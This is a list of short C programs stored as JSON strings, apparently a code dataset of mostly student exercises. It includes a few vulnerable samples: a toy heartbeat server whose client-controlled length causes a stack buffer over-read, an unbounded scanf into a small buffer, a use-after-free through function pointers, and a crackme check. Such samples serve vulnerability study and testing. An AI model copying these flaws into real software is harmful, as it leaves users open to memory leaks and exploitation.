    "#include <stdio.h>\n#include <stdlib.h>\nchar *serial = \"\\x31\\x3e\\x3d\\x26\\x31\";\nint check(char *ptr)\n{\n  int i = 0;\n  while (i < 5){\n    if (((ptr[i] - 1) ^ 0x55) != serial[i])\n      return 1;\n    i++;\n  }\n  return 0;\n}\nint main(int ac, char **av)\n{\n  int ret;\n  if (ac != 2)\n    return -1;\n  ret = check(av[1]);\n  if (ret == 0)\n    printf(\"Win\\n\");\n  else\n    printf(\"fail\\n\");\n  return 0;\n}",
    "#include <stdio.h>\n#include <limits.h>\nint length(char s[]){\n    int n=0;\n    for(int i=0;s[i]!='\\0';i++){\n        n++;\n    }\n    return n;\n}\nvoid findMinIndex(char s2[],char s1[],int n2,int n1){\n    int min_index=2147483647;\n    for(int i=0;i<n2;i++){\n        for(int j=0;j<n1;j++){\n            if(s2[i]==s1[j]){\n                if(j<min_index){\n                    min_index=j;\n                    break;\n                }\n            }\n        }\n    }\n    if(min_index!=2147483647){\n        printf(\"\\nMinimum index character is: %c\",s1[min_index]);\n    }else{\n        printf(\"\\nThere is no minimumu index character\");\n    }\n}\nint main(){\n    char a[]=\"owl\";\n    char b[]=\"hellow\";\n    int n1=length(a);\n    int n2=length(b);\n    printf(\"String 1: %s\",a);\n    printf(\"\\nString 2: %s\",b);\n    findMinIndex(a,b,n1,n2);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(int argc, char **argv) {\n    int x, y, sum;\n    printf(\"Welcome to the simple addition calculator\\n\");\n    printf(\"Enter your first number: \");\n    if (scanf(\"%d\", &x) != 1) {\n        printf(\"That's not a real number. Go away!\");\n        return 1;\n    }\n    printf(\"And the second number: \");\n    if (scanf(\"%d\", &y) != 1) {\n        printf(\"That's not a real number. Go away!\");\n        return 1;\n    }\n    sum = x + y;\n    printf(\"The sum of %d and %d is %d\\n\", x, y, sum);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main() {\n    int *x;\n    int i = 0;\n    while(1) {\n        printf(\"%d \", i++);\n        x = malloc(1000000*sizeof(int));\n        if (x == ((void*)0)){\n            break;\n        }\n    }\n    free(x);\n    return 0;\n}",
    "#include <stdio.h>\n\nint main(void)\n{\n    float radius;\n    float volume;\n    printf(\"radius please: \");\n    scanf(\"%f\", &radius);\n    volume = (4.0f / 3.0f) * 3.14159f * radius * radius * radius;\n    printf(\"%.2f\\n\", volume);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\n#include <unistd.h>\nint main(int argc, char const *argv[])\n{\n int num[3];\n int newNum[3];\n int point = 0;\n int sum = 0;\n int player = 0;\n srand(time(((void*)0)));\n for (int i = 0; i < 3; i++)\n {\n  num[i] = rand()%(6-1+1)+1;\n  point += num[i];\n }\n printf(\"Player rolled %d + %d + %d = %d \\n\", num[0], num[1], num[2], point);\n if (point >= 13) {\n  printf(\"Player wins\\n\");\n  player = 1;\n } else if (point <= 6) {\n  printf(\"Player loses\\n\");\n  player = 2;\n }\n if (player != 2) {\n  do {\n   sum = 0;\n   for (int i = 0; i < 3; i++)\n   {\n    newNum[i] = rand()%(6-1+1)+1;\n    sum += newNum[i];\n   }\n   printf(\"Player rolled %d + %d + %d = %d \\n\", newNum[0], newNum[1], newNum[2], sum);\n   if (sum == point) {\n    printf(\"Player wins\\n\");\n    player = 3;\n   } else if (sum <= 6) {\n    printf(\"Player loses\\n\");\n    player = 2;\n   } else if (sum >= 13) {\n    player = 1;\n   }\n  } while (player == 1);\n }\n return 0;\n}",
    "#include <stdio.h>\nint sommeDesProduits(int n);\nint main()\n{\n int n;\n printf(\"Entrer un nombre n: \");\n scanf(\"%d\", &n);\n printf(\"sommeDesProduits(%d)=%d\\n\", n, sommeDesProduits(n));\n}\nint sommeDesProduits(int n)\n{\n int s = 0;\n for (int j = 2; j <= n; j++)\n  for (int i = 2; i <= j; i++)\n   s += j * i;\n return s;\n}",
    "#include <stdio.h>\nvoid print_frame(int m, int n, int d)\n{\n    for (int i = 0; i < d; ++i)\n    {\n        for (int j = 0; j < m; ++j)\n            printf(\"*\");\n        printf(\"\\n\");\n    }\n    for (int i = 0; i < n - 2 * d; ++i)\n    {\n        for (int j = 0; j < d; ++j)\n            printf(\"*\");\n        for (int j = d; j < m - d; ++j)\n            printf(\" \");\n        for (int j = m - d; j < m; ++j)\n            printf(\"*\");\n        printf(\"\\n\");\n    }\n    for (int i = 0; i < d; ++i)\n    {\n        for (int j = 0; j < m; ++j)\n            printf(\"*\");\n        printf(\"\\n\");\n    }\n}\nint main()\n{\n    int n, m, d;\n    printf(\"Welcome to 8.3! Please enter three numbers (n, m and d):\\n\");\n    if (scanf(\"%d%d%d\", &n, &m, &d) != 3)\n    {\n        printf(\"Invalid input. Exiting.\\n\");\n        return 1;\n    }\n    print_frame(n, m, d);\n    return 0;\n}",
    "#include <inttypes.h>\n#include <stdio.h>\n#include <stdlib.h>\nint main(int argc, char *argv[]) {\n  char ch = getchar();\n  while (ch != 'a') {\n    if (ch != '\\n')\n      printf(\"ch was %c, value %d\\n\", ch, ch);\n    ch = getchar();\n  }\n  exit(0);\n}",
    "#include <sys/types.h>\n#include <unistd.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <errno.h>\nint main()\n {\n   int fd;\n   char nome[] = \"/tmp/arqXXXXXX\";\n   char buffer[] = \"teste de escrita\";\n   size_t tam = 100;\n   if (!(fd = mkstemp(nome)))\n     {\n       printf(\"Erro mkstemp %d: %s\\n\", errno, strerror(errno));\n       exit(1);\n     }\n   printf(\"Nome do arquivo temporario: %s\\n\", nome);\n   if (write(fd, buffer, tam) == -1)\n     {\n       printf(\"Erro write %d: %s\\n\", errno, strerror(errno));\n       exit(2);\n     }\n   if (close(fd) == -1)\n     {\n       printf(\"Erro close %d: %s\\n\", errno, strerror(errno));\n       exit(3);\n     }\n   if (unlink(nome) != 0)\n     {\n       printf(\"Erro unlink %d: %s\\n\", errno, strerror(errno));\n       exit(4);\n     }\n }",
    "#include <stdio.h>\nint main () {\n printf(\"EOF :%d\\n\",(-1));\n return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\nint main(void) {\n    float massa, altura, _IMC;\n    printf(\"Digite sua Massa (Kg): \");\n    scanf(\"%f\",&massa);\n    printf(\"Digite sua Altura (Metros): \");\n    scanf(\"%f\",&altura);\n    _IMC = (massa/altura * altura);\n    printf(\"Seu IMC e: %0.2f\\n\",_IMC);\n    if (_IMC<17) {\n        printf(\"Muito abaixo do peso.\\n\");\n    } else if (_IMC>17 && _IMC<18.49) {\n        printf(\"Abaixo do peso.\\n\");\n    } else if (_IMC>18.5 && _IMC<24.99) {\n        printf(\"Peso normal.\\n\");\n    } else if (_IMC>25 && _IMC<29.99) {\n        printf(\"Acima do peso.\\n\");\n    } else if (30 && _IMC<34.99) {\n        printf(\"voc\u00ea esta Obeso.\\n\");\n    } else if (_IMC>35 && _IMC<39.9) {\n        printf(\"Obesidade Severa.\\n\");\n    } else if (_IMC>40) {\n        printf(\"voc\u00ea esta em Obesidade MORBIDA.\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n    float winnings;\n    int irs_limit_exceeded;\n    scanf(\"%f\\n\", &winnings);\n    if(winnings > 2000.00)\n    {\n        irs_limit_exceeded = 1;\n    }\n    else\n    {\n        irs_limit_exceeded = 0;\n    }\n    if(irs_limit_exceeded)\n    {\n    }\n    if(winnings > 2000.00)\n    {\n        printf(\"Generate tax form for customer.\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <stdarg.h>\nvoid show_array(const double ar[], int n);\ndouble * new_d_array(int n, ...);\nint main(void)\n{\n double * p1 = 0;\n double * p2 = 0;\n p1 = new_d_array(5, 1.2, 2.3, 3.4, 4.5, 5.6);\n p2 = new_d_array(4, 100.0, 20.00, 8.08, -1890.0);\n show_array(p1, 5);\n show_array(p2, 4);\n free(p1);\n free(p2);\n return 0;\n}\nvoid show_array(const double ar[], int n)\n{\n for (int i = 0; i < n; i++)\n {\n  printf(\"%lf \", ar[i]);\n  if (i % 3 == 2)\n   putchar('\\n');\n }\n putchar('\\n');\n}\ndouble * new_d_array(int n, ...)\n{\n va_list ap;\n __builtin_va_start(ap, n);\n double * p;\n p = malloc(n * sizeof(double));\n for (int i = 0; i < n; i++)\n {\n  p[i] = __builtin_va_arg(ap, double);\n }\n __builtin_va_end(ap);\n return p;\n}",
    "#include <stdio.h>\nint main(){\n  char name[20];\n  printf(\"What's your name: \");\n    scanf(\"%s\", name);\n  printf(\"Greetings %s!\", name);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main(int l, char *s[])\n{\nint sum = 0;\nchar c[15];\nchar *convert, *input;\nwhile (--l)\n{\ns++, input = *s;\nsprintf(c, \"%d\", atoi(*s));\nconvert = c;\nif (strcmp(input, convert) != 0)\n{\nprintf(\"Error\\n\");\nreturn (1);\n}\nsum += atoi(*s);\n}\nprintf(\"%d\\n\", sum);\nreturn (0);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(){\n    int n, i;\n    float num[100], sum = 0.0, avg;\n    printf(\"Kac sayinin ortalamasini bulmak istiyorsun: \");\n    scanf(\"%d\", &n);\n    while( n > 100 || n <= 1 ){\n        printf(\"1 ile 100 arasinda bir sayi sec\\n\");\n        printf(\"Yine sayi gir: \\n\");\n        scanf(\"%d\", &n);\n    }\n    for(i = 0 ; i <n ; i++){\n        printf(\"%d. Sayi gir:\", i+1);\n        scanf(\"%f\", &num[i]);\n        sum += num[i];\n    }\n    avg = sum / n;\n    printf(\"Ortalama: %.2f\", avg);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nint any(char str1[], char str2[]);\nint main(void)\n{\n  char str1[1000] = \"xxxabcabc\";\n  char str2[1000] = \"cbaa\";\n  printf(\"%d\", any(str1, str2));\n  return 0;\n}\nint any(char str1[], char str2[])\n{\n  int i, j;\n  for (i = 0; str1[i] != '\\0'; ++i)\n  {\n    for (j = 0; str2[j] != '\\0'; ++j)\n    {\n      if (str1[i] == str2[j])\n      {\n        return i;\n      }\n    }\n  }\n  return -1;\n}",
    "#include<stdio.h>\nint main()\n{\n  float f;\n  scanf(\"%f\", &f);\n  printf(\"%.3f\\n\", 5*(f-32)/9);\n  return 0;\n}",
    "int main() {\n  return 0;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\ntypedef void (*fptr)(void *);\nvoid func(void *ptr)\n{\n  printf(\"%p\\n\", ptr);\n  free(ptr);\n}\n\nint main()\n{\n  fptr *array;\n  int i;\n  array = malloc(sizeof(fptr) * 30);\n  for (i = 0; i < 30; i++)\n    array[i] = func;\n  array[0](array);\n  array[1](((void*)0));\n  return 0;\n}",
    "#include <stdio.h>\nvoid printf_array(int *arr, int count) {\n  int i;\n  for (i = 0; i < count; i++) {\n    printf(\"%d \", arr[i]);\n  }\n  printf(\"\\n\");\n}\nvoid inplace_swap(int *x, int *y) {\n  *y = *x ^ *y;\n  *x = *x ^ *y;\n  *y = *x ^ *y;\n}\nvoid test_inplace_swap() {\n  int a = 10;\n  int b = 20;\n  printf(\"origin: a = %d, b = %d\\n\", a, b);\n  inplace_swap(&a, &b);\n  printf(\"swapped: a = %d, b = %d\\n\", a, b);\n}\nvoid reverse_array(int *arr, int count) {\n  int first, last;\n  for (\n    first = 0, last = count - 1;\n    first < last;\n    first++, last--\n  ) {\n    inplace_swap(&arr[first], &arr[last]);\n  }\n}\nvoid test_reverse_array() {\n  int arr1[] = {1, 2, 3, 4};\n  int arr2[] = {1, 2, 3, 4, 5};\n  printf(\"origin arr1: \");\n  printf_array(arr1, sizeof(arr1) / sizeof(int));\n  printf(\"origin arr2: \");\n  printf_array(arr2, sizeof(arr2) / sizeof(int));\n  reverse_array(arr1, sizeof(arr1) / sizeof(int));\n  reverse_array(arr2, sizeof(arr2) / sizeof(int));\n  printf(\"reversed arr1: \");\n  printf_array(arr1, sizeof(arr1) / sizeof(int));\n  printf(\"reversed arr2: \");\n  printf_array(arr2, sizeof(arr2) / sizeof(int));\n}\nint main() {\n  int a = 0X12;\n  int b = ~a;\n  printf(\"b = %x\\n\", b);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdint.h>\n#include <math.h>\nvoid centerradius(float x1, float y1, float x2, float y2, float x3, float y3, float *centerX, float *centerY, float *radius) {\n    float a,b,c,d;\n    a = x1 * (y2 - y3) - y1 * (x2 - x3) + x2 * y3 - x3 * y2;\n    b = (x1 * x1 + y1 * y1) * (y3 - y2) + (x2 * x2 + y2 * y2) * (y1 - y3) + (x3 * x3 + y3 * y3) * (y2 - y1);\n    c = (x1 * x1 + y1 * y1) * (x2 - x3) + (x2 * x2 + y2 * y2) * (x3 - x1) + (x3 * x3 + y3 * y3) * (x1 - x2);\n    d = (x1 * x1 + y1 * y1) * (x3 * y2 - x2 * y3) + (x2 * x2 + y2 * y2) * (x1 * y3 - x3 * y1) + (x3 * x3 + y3 * y3) * (x2 * y1 - x1 * y2);\n    *radius = sqrt((b * b + c * c - 4 * a * d) / (4 * a * a));\n    *centerX = -b / (2 * a);\n    *centerY = -c / (2 * a);\n}\nint main(int argc, char **argv) {\n    float cx,cy,r;\n    centerradius(5,0,0,5,7,7,&cx,&cy,&r);\n    printf(\"centerX: %0.2f\\n\",cx);\n    printf(\"centerY: %0.2f\\n\",cy);\n    printf(\"radius:  %0.2f\\n\",r);\n    return 0;\n}",
    "#include<stdio.h>\n#include<sys/types.h>\n#include<sys/stat.h>\n#include<unistd.h>\n#include<fcntl.h>\n\nint main(int argc,char* argv[]){\n    if(argc==1){\n        printf(\"Usage: cp <old/path> <new/path>\\n\");\n        return 0;\n    }\n    if(argc<3){\n        fprintf((stderr),\"W:Too few arguments.\\n\");\n        return 1;\n    }\n    int oldfd = open(argv[1],(0x04000000));\n    if(oldfd<0){\n        fprintf((stderr),\"E: Unable to access file.\\n\");\n        return 1;\n    }\n    int newfd = open(argv[2],(0x10000000)|(((__wasi_oflags_t)(1 << 0)) << 12),0644);\n    if(newfd<0){\n        fprintf((stderr),\"E:Unable to create new file for copy or \"\n         \"file already exists.\\n\");\n        return 1;\n    }\n    char buffer[64];\n    int lastRead=0,sumRead=0;\n    while((lastRead=read(oldfd,buffer,64))!=0){\n        if(write(newfd,buffer,lastRead)!=lastRead){\n            fprintf((stderr),\"E:Error copying file.Aborting.\\n\");\n            return 1;\n        }else{\n            sumRead+=lastRead;\n        }\n    }\n    printf(\"I: Copied %d bytes\\n\",sumRead);\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint min[10010];\nint main(void){\n    memset(min,50,sizeof(min));\n    min[0] = 0;\n    int n, k;\n    scanf(\"%d %d\", &n, &k);\n    for(int i=0;i<n;i++){\n        int coin;\n        scanf(\"%d\", &coin);\n        for(int j=coin;j<=k;j++){\n            min[j] = min[j] > min[j-coin] +1 ? min[j-coin] +1 : min[j];\n        }\n    }\n    printf(\"%d\", min[k]==min[10005] ? -1 : min[k]);\n}",
    "#include <stdio.h>\nint main() {\n float vetor[6], media, total = 0;\n int j, count=0;\n scanf(\"%f\\n%f\\n%f\\n%f\\n%f\\n%f\", &vetor[0], &vetor[1], &vetor[2], &vetor[3], &vetor[4], &vetor[5]);\n for(j = 0; j < 6; j++) {\n  if(vetor[j] > 0){\n   total += vetor[j];\n   count++;\n  }\n }\n media = total/count;\n printf(\"%d valores positivos\\n\", count);\n printf(\"%.1f\\n\", media);\n return 0;\n}",
    "#include <math.h>\n#include <stdio.h>\nchar isprime(int no)\n{\n    int sq;\n    if (no == 2)\n    {\n        return 1;\n    }\n    else if (no % 2 == 0)\n    {\n        return 0;\n    }\n    sq = ((int)(sqrt(no))) + 1;\n    for (int i = 3; i < sq; i += 2)\n    {\n        if (no % i == 0)\n        {\n            return 0;\n        }\n    }\n    return 1;\n}\nint main()\n{\n    int maxNumber = 0;\n    int n = 0;\n    int n1;\n    scanf(\"%d\", &n);\n    if (isprime(n) == 1)\n        printf(\"%d\", n);\n    else\n    {\n        while (n % 2 == 0)\n        {\n            n = n / 2;\n        }\n        if (isprime(n) == 1)\n        {\n            printf(\"%d\\n\", n);\n        }\n        else\n        {\n            n1 = ((int)(sqrt(n))) + 1;\n            for (int i = 3; i < n1; i += 2)\n            {\n                if (n % i == 0)\n                {\n                    if (isprime((int)(n / i)) == 1)\n                    {\n                        maxNumber = n / i;\n                        break;\n                    }\n                    else if (isprime(i) == 1)\n                    {\n                        maxNumber = i;\n                    }\n                }\n            }\n            printf(\"%d\\n\", maxNumber);\n        }\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid print_bit(float f);\nint main(int argc, char* argv[]) {\n    float f = 2.625;\n    printf(\"f = %-12f : \", f);\n    print_bit(f);\n    return 0;\n}\nvoid print_bit(float f) {\n    int i;\n    unsigned int *j = ((unsigned int *)&f);\n    unsigned int s = *j;\n    for (i=0; i<32; i++) {\n        printf(\"%c\", ((0x80000000)&s) ? '1' : '0');\n        if (i==0 || i==8) printf(\" \");\n        s = s << 1;\n    }\n    printf(\"\\n\");\n}",
    "#include <stdio.h>\nint func()\n{\n static int n = 0;\n n++;\n printf(\"function is called %d times.\\n\", n);\n return n;\n}\nint main()\n{\n int i, n = 0;\n for (i = 1; i<=5; i++) {\n  func();\n }\n printf(\"n=%d\\n\", n);\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\nint n;\nint x;\nint i;\nint max = -2147483647;\n(void)scanf(\"%d\", &n);\nfor (i = 0; i < n; i++)\n{\n(void)scanf(\"%d\", &x);\nif (x > max)\nmax = x;\n}\nprintf(\"%d\", max);\nreturn 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(){\n    int i;\n    for(i=0;i<=127;i++){\n        printf(\"%3d = %c\\n\", i, i);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n  int numero;\n  printf (\"Digite um n\u00famero inteiro: \");\n  scanf (\"%d\" ,&numero);\n  if (numero % 2 == 0) {\n    printf (\"O n\u00famero %d \u00e9 par\", numero);\n  } else {\n    printf (\"O n\u00famero %d \u00e9 \u00edmpar\", numero);\n  }\n}",
    "#include <stdio.h>\ndouble func_block(double d)\n{\n double p = 0.0;\n return p;\n}\nint main()\n{\n func_block(1.0);\n}\nvoid f1(int hello, double world)\n{\n}",
    "#include <stdio.h>\n\n\nint main()\n{\n int c;\n int status = 1;\n while((c = getchar()) != (-1))\n {\n  if(c != ' ' && c != '\\n' && c != '\\t')\n  {\n   putchar(c);\n   status = 0;\n  }\n  else if(status == 0)\n  {\n   putchar('\\n');\n   status = 1;\n  }\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(int argc, char *argv[])\n{\n int m[3][3], i, j, somap = 0, somas = 0, result;\n printf(\"Ex 02 - Informe 9 valores inteiros para a matriz 3x3:\\n\\n\");\n for(i=0; i<3; i++)\n {\n  for(j=0; j<3; j++)\n  {\n   printf(\"Informe o valor para a pos %d %d: \", i, j);\n   scanf(\"%d\", &m[i][j]);\n   if(i == j)\n   {\n    somap += m[i][j];\n   }\n   if(i+j == 2)\n   {\n    somas += m[i][j];\n   }\n  }\n }\n printf(\"\\n\\nMatriz 3x3 foi gerada com sucesso!\\n\\n\");\n result = somap - somas;\n printf(\"A subtracao entre as somas das diagonais = %d\", result);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <unistd.h>\n#include <netinet/in.h>\n#include <string.h>\n\nunsigned int recvUntilNull(char * buffer)\n{\n char *tmp = buffer;\n int totalBytes = 0;\n char tmpLocal[2] = {0};\n do\n {\n  if (read(0, tmpLocal, 1) != -1)\n  {\n   *tmp++ = tmpLocal[0];\n   totalBytes++;\n  }\n  else break;\n } while (tmpLocal[0] != 0x00);\n return totalBytes;\n}\nunsigned int doHeartbeat()\n{\n char recvBuf[300] = {0};\n int heartbeatSize = 0;\n signed int bytesRecv;\n bytesRecv = read(0, recvBuf, 9);\n if(0 != strstr(recvBuf,\"HELLO\"))\n {\n  bytesRecv = read(0, (char *)&heartbeatSize, 4);\n  recvUntilNull(recvBuf);\n  write(1, recvBuf, heartbeatSize);\n  return 0;\n }\n return 1;\n}\nvoid serverFunc()\n{\n while(!doHeartbeat());\n}\nint main()\n{\n serverFunc();\n return 0;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\n#include <time.h>\n#include <string.h>\nvoid game(int rounds);\nint main() {\n  int r = 0;\n  printf(\"how many rounds would you like to play?\\n\");\n  scanf(\"%i\", &r);\n  game(r);\n  return r;\n}\nvoid game(int rounds){\n  int AIscore = 0;\n  int UserScore = 0;\n  char AIchoice[10];\n  char userchoice[10];\n  for(int i =0; i < rounds; i++) {\n    printf(\"Which do you choose? rock, paper, or scissors?\\n\");\n    scanf(\"%s\",userchoice);\n    int AInum = rand() % 3;\n    if(AInum == 0){\n      strcpy(AIchoice,\"rock\");\n   }\n    else if(AInum == 1){\n      strcpy(AIchoice,\"paper\");\n   }\n   else if(AInum == 2){\n     strcpy(AIchoice,\"scissors\");\n   }\n    if(strstr(userchoice,\"rock\")&& AInum == 0){\n     printf(\"AI chose rock\\n\");\n     printf(\"its a tie!\\n\");\n     printf(\"AI score: %i, Player Score: %i\\n\",AIscore,UserScore);\n   }\n   else if(strstr(userchoice,\"rock\") && AInum == 1){\n    printf(\"AI chose paper\\n\");\n    printf(\"paper covers rock\\n\");\n    AIscore++;\n    printf(\"AI score: %i, Player Score: %i\\n\",AIscore,UserScore);\n   }\n   else if(strstr(userchoice,\"rock\") && AInum == 2){\n     printf(\"AI chose scissors\\n\");\n     printf(\"rock bashes scissors\\n\");\n     UserScore++;\n     printf(\"AI score: %i, Player Score: %i\\n\",AIscore,UserScore);\n   }\n  else if(strstr(userchoice,\"paper\") && AInum == 0){\n    printf(\"AI chose rock\\n\");\n    printf(\"paper covers rock\\n\");\n    UserScore++;\n    printf(\"AI score: %i, Player Score: %i\\n\",AIscore,UserScore);\n   }\n   else if(strstr(userchoice,\"paper\") && AInum == 1){\n     printf(\"AI chose paper\\n\");\n     printf(\"its a tie!\\n\");\n     printf(\"AI score: %i, Player Score: %i\\n\",AIscore,UserScore);\n   }\n   else if(strstr(userchoice,\"paper\") && AInum == 2){\n     printf(\"AI chose scissors\\n\");\n     printf(\"scissors cut paper\\n\");\n     AIscore++;\n     printf(\"AI score: %i, Player Score: %i\\n\",AIscore,UserScore);\n   }\n   else if(strstr(userchoice,\"scissors\") && AInum == 0){\n    printf(\"AI chose rock\\n\");\n    printf(\"rock bashes scissors\\n\");\n    AIscore++;\n    printf(\"AI score: %i, Player Score: %i\\n\",AIscore,UserScore);\n   }\n   else if(strstr(userchoice,\"scissors\") && AInum == 1){\n     printf(\"AI chose paper\\n\");\n     printf(\"scissors cut paper\\n\");\n     UserScore++;\n     printf(\"AI score: %i, Player Score: %i\\n\",AIscore,UserScore);\n   }\n   else if(strstr(userchoice,\"scissors\") && AInum == 2){\n     printf(\"AI chose scissors\\n\");\n     printf(\"its a tie!\");\n     printf(\"AI score: %i, Player Score: %i\\n\",AIscore,UserScore);\n   }\n   else{\n    printf(\"AI chose %s\\n\",AIchoice);\n    printf(\"You entered an invalid choice: %s\\n\",userchoice);\n    printf(\"AI score: %i, Player Score: %i\\n\",AIscore,UserScore);\n   }\n  }\n  if(UserScore < AIscore){\n    printf(\"The computer won!!\\n\");\n  }\n  else if(UserScore > AIscore){\n    printf(\"You win!!\\n\");\n  }\n  else{\n    printf(\"You tied with the computer!\\n\");\n  }\n}",
    "#include <stdio.h>\n#include <pthread.h>\nstatic volatile int counter = 0;\nvoid\n*mythread(void* arg)\n{\n  printf(\"%s: begin\\n\", (char*) arg);\n  int i;\n  for (i = 0; i < 1e7; i++) {\n    counter = counter + 1;\n  }\n  printf(\"%s: done\\n\", (char*) arg);\n  return ((void*)0);\n}\nint main(int argc, char*argv[])\n{\n  pthread_t p1, p2;\n  printf(\"main: begin (counter = %d)\\n\", counter);\n  pthread_create(&p1, ((void*)0), mythread, \"A\");\n  pthread_create(&p2, ((void*)0), mythread, \"B\");\n  pthread_join(p1, ((void*)0));\n  pthread_join(p2, ((void*)0));\n  printf(\"main: done with both (counter = %d)\\n\", counter);\n  return 0;\n}",
    "#include <stdio.h>\nint main(void){\n    int* pi = ((void*)0);\n    printf(\"%i\\n\", *pi);\n}",
    "#include <stdio.h>\nint main(){\n    int arr[1000],i,a,j,t;\n    scanf(\"%d\",&t);\n    if(t>=1 && t<=1000){\n        for(i=0;i<t;i++){\n            scanf(\"%d\",&arr[i]);\n        }\n       for(j=0;j<t;j++){\n         if(arr[j]%2==0)\n                printf(\"0\\n\");\n            else\n                printf(\"1\\n\");\n       }\n    }\n    return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nint main (void)\n{\n    int est, tra, dor, total;\n    float percent;\n    printf(\"informe a quantidade de horas gasta dormindo: \");\n    scanf(\"%d\",&dor);\n    printf(\"informe a quantidade de horas gasta estudando: \");\n    scanf(\"%d\",&est);\n    printf(\"informe a quantidade de horas gasta trabalhando: \");\n    scanf(\"%d\",&tra);\n    total=est+tra+dor;\n    percent=dor/total*100.0;\n    printf(\"vc gasta %.2f%% das horas semanais dormindo\\n\",dor);\n    percent=est/total*100.0;\n    printf(\"vc gasta %.2f%% das horas semanais estudando\\n\",est);\n    percent=tra/total*100.0;\n    printf(\"vc gasta %.2f%% das horas semanais trabalhando\\n\",tra);\n}",
    "#include <stdio.h>\n#include <string.h>\nint A[100],B[100],C[100];\nchar buf[1000];\nvoid buf2big(char *buf,int *A)\n{\n    int n=strlen(buf);\n    int i;\n    for(i=0; i<n; i++)\n    {\n        A[n-i-1]=buf[i]-'0';\n    }\n}\nint dec(int *A,int *B)\n{\n    int i;\n    for(i=0; i<100; i++)\n    {\n        C[i]=A[i]-B[i];\n    }\n    for(i=0; i<100-1; i++)\n    {\n        if(C[i]<0)\n        {\n            C[i]+=10;\n            C[i+1]--;\n        }\n    }\n    int l=100;\n    while(l>1 && C[l-1]==0)\n    {\n        --l;\n    }\n    return l;\n}\nint cmp(int *A,int *B)\n{\n    int i;\n    for( i=99; i>=0; --i)\n    {\n        if(A[i]!=B[i])\n            return A[i]-B[i];\n    }\n    return 0;\n}\nvoid print(int n)\n{\n    int i;\n    for(i=n-1; i>=0; --i)\n    {\n        printf(\"%d\",C[i]);\n    }\n}\nint main()\n{\n    scanf(\"%s\",buf);\n    buf2big(buf,A);\n    scanf(\"%s\",buf);\n    buf2big(buf,B);\n    int neg=0,l=0;\n    int c=cmp(A,B);\n    if(c>=0)\n    {\n        l=dec(A,B);\n    }\n    else if(c<0)\n    {\n        neg=1;\n        l=dec(B,A);\n    }\n    if(neg)\n    {\n        putchar('-');\n    }\n    print(l);\n    return 0;\n}",
    "#include <stdio.h>\nint main( void )\n{\n   printf( \"%d\\n\", 455 );\n   printf( \"%i\\n\", 455 );\n   printf( \"%d\\n\", +455 );\n   printf( \"%d\\n\", -455 );\n   printf( \"%hd\\n\", 32000 );\n   printf( \"%ld\\n\", 2000000000L );\n   printf( \"%o\\n\", 455 );\n   printf( \"%u\\n\", 455 );\n   printf( \"%u\\n\", -455 );\n   printf( \"%x\\n\", 455 );\n   printf( \"%X\\n\", 455 );\n   return 0;\n}",
    "#include <stdio.h>\nint main(void) {\n    int N[20], j = 0;\n    for (int i = 0; i < 20; i++)\n        scanf(\"%d\", &N[i]);\n    for (int i = 19, j = 0; i >= 0; i--, j++)\n        printf(\"N[%d] = %d\\n\", j, N[i]);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <stdbool.h>\nint main (int argc, const char *args []) {\n    int n;\n    scanf (\"%d\", &n);\n    int **mass = (int **) malloc (n * sizeof (int *));\n    for (int i = 0; i < n; i ++) {\n        mass [i] = (int *) malloc (n * sizeof (int));\n        for (int j = 0; j < n; j ++) {\n            mass [i][j] = (i + 1) * (j + 1);\n        }\n    }\n    int x1, y1;\n    int x2, y2;\n    while (1) {\n        scanf (\"%d\", &x1);\n        if (x1 == 0) {\n            break;\n        } else {\n            scanf (\"%d %d %d\", &y1, &x2, &y2);\n            for (int i = 0; i < y2 - y1 + 1; i ++) {\n                for (int j = 0; j < x2 - x1 + 1; j ++) {\n                    printf (\"%d \", mass [y1 + i - 1][x1 + j - 1]);\n                }\n                printf (\"\\n\");\n            }\n        }\n    }\n    for (int i = n - 1; i >= 0; i --) {\n        free (mass [i]);\n    }\n    free (mass);\n    return 0;\n}",
    "#include <stdio.h>\n#include <errno.h>\n#include <unistd.h>\n#include <time.h>\nint main() {\n  time_t start;\n  time_t taken;\n  start = time(0);\n  printf(\"sleep(2) ret: %d\\n\", sleep(2));\n  taken = time(0) - start;\n  printf(\"after sleep(2) between 2 and 3: %d\\n\", taken >= 2 && taken <= 3);\n  printf(\"errno: %d\\n\", errno);\n  errno = 0;\n  start = time(0);\n  printf(\"usleep(3000000) ret: %d\\n\", usleep(3000000));\n  taken = time(0) - start;\n  printf(\"after usleep(3000000) between 3 and 4: %d\\n\", taken >= 3 && taken <= 4);\n  printf(\"errno: %d\\n\", errno);\n  return 0;\n}",
